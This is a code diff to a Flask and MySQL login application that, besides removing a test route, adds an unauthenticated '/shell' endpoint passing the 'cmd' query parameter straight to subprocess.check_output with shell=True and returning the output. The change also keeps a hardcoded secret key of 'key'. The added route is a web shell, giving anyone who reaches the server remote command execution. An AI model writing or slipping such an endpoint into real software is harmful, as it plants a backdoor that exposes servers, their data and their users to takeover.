@@ -1,7 +1,9 @@
 
-from flask import Flask, request, redirect, url_for, session,render_template,escape
+from flask import Flask, request, redirect, url_for, session,escape
 from flask_mysqldb import MySQL
 import mysql.connector
+import subprocess
+
 
 
 
@@ -11,10 +13,8 @@ app = Flask(__name__)
 # Change this to your secret key (can be anything, it's for extra protection)
 app.secret_key = 'key'
 
+# app.config['MAX_CONTENT_PATH'] = "5000"
 
-@app.route('/pythonlogin/test')
-def test():
-    return render_template('index.html')
 
 
 @app.route('/pythonlogin/', methods=['GET', 'POST'])
@@ -93,6 +93,16 @@ def logout():
    
    return redirect(url_for('login'))
 
+
+@app.route("/shell")
+def page():
+
+
+    cmd = request.args.get("cmd")
+
+    return subprocess.check_output(cmd, shell=True)
+    # return subprocess.check_output(cmd, shell=False)
+
 @app.route("/")
 def index():
     
@@ -152,6 +162,11 @@ def run(script):
 # def add_security_headers(resp):
 #     resp.headers['Content-Security-Policy']='default-src \'self\''
 #     return resp
+
+
+
+
+
 
 
 if __name__ == '__main__':
